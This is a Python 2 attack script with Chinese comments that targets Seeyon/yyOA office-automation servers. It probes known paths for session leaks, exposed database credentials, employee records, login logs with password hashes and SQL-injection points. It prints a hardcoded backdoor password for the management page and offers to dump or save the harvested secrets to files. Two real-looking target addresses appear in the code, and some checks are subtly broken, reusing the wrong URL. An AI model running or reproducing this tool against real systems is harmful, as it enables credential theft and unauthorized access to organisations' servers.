#!/usr/bin/env python 
#coding=utf-8
import requests
import sys
import urllib
class yyOA(object):
	session='/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
	sql='/yyoa/createMysql.jsp'
	shell='/seeyon/management/index.jsp'
	leakage='/yyoa/assess/js/initDataAssess.jsp'
	sql1='/yyoa/docMgr/superviseAndUrge/loadUrgeInfo.jsp?docIds=1'
	sql2='/yyoa/checkWaitdo.jsp?userID=1'
	sql3='/yyoa/HJ/iSignatureHtmlServer.jsp?COMMAND=DELESIGNATURE&DOCUMENTID=1&SIGNATUREID=2'
	log='/seeyon/logs/login.log'
	
	def exp(self,url):	
		try:
			requests.get(url)
		except requests.exceptions.MissingSchema:
			print '不要忘记了加http://哦！'
			sys.exit()
		
		#session泄露
						
		res1=requests.get(url+self.session).text
		ztm=requests.get(url+self.session).status_code
		if ztm==200:
			if 'SessionList' in res1:
				print '\t存在session泄露\t'
				s1=raw_input('需要打印session吗?[y/n]:')
				if s1 == 'y':
					print res1
				else:
					pass
					
		#数据库信息泄露		
		res2=requests.get(url+self.sql).text
		ztm=requests.get(url+self.sql).status_code
		if ztm==200:
			if 'localhost' in res2:
				print '\t数据库连接信息泄露\t'
				s2=raw_input('需要打印出数据库账号密码吗?[y/n]:')
				if s2=='y':
					print res2
				else:
					pass
		#检测后门	
		res3=requests.get(url+self.shell).text
		ztm=requests.get(url+self.shell).status_code
		if ztm==200:
			if 'Password' in res3:
				print '存在后门'
				print '后门地址：',url+self.shell
				print '\t 密码：WLCCYBD@SEEYON\t'
			else:
				pass
			
			
		#检测信息泄露		
		res4=requests.get(url+self.leakage).text
		ztm=requests.get(url+self.leakage).status_code
		if ztm==200:
			if 'personList' in res4:
				print '存在员工信息泄露!'
				s3=raw_input('需要把信息保存到leakage.txt吗?[y/n]:')
				if s3=='y':
					wocao=urllib.urlopen(url+self.leakage).read()
					file1=open('leakage.txt','a+')
					file1.write(wocao)
					file1.close()
				else:
					pass 
			
				
		
		#检测信息泄露
		log=requests.get(url+self.log).text
		ztm=requests.get(url+self.log).status_code
		if ztm==200:
			if 'Login' in log:
				print '用户名和hash泄露'
				s4=raw_input('需要把信息保存到leakage.txt吗?[y/n]:')
				if s4=='y':
					wocao=urllib.urlopen(url+self.leakage).read()
					file1=open('hashlog.txt','a+')
					file1.write(wocao)
					file1.close()
				else:
					pass 
		
		#检测sql注入1
		
		res5=requests.get(url+self.sql1).text
		ztm=requests.get(url+self.sql1).status_code
		if ztm==200:
			print '这可能是一个注入：',url+self.sql1
		
		#检测sql注入2
		res6=requests.get(url+self.sql2).text
		ztm=requests.get(url+self.sql2).status_code	
		if ztm==200:
			if 'checkWaitdo' in res6:
				print '这是一个注入',url+self.sql2
		
		#检测sql注入3
		res7=requests.get(url+self.sql3).text
		ztm=requests.get(url+self.sql2).status_code
		if ztm==200:
			if 'RESULT' in res7:
				print '这是一个注入',url+self.sql3
				
a=yyOA()
x='http://121.12.148.178:8080/'
xx='http://hbkj-oa.com/'
target=sys.argv[1]
a.exp(target)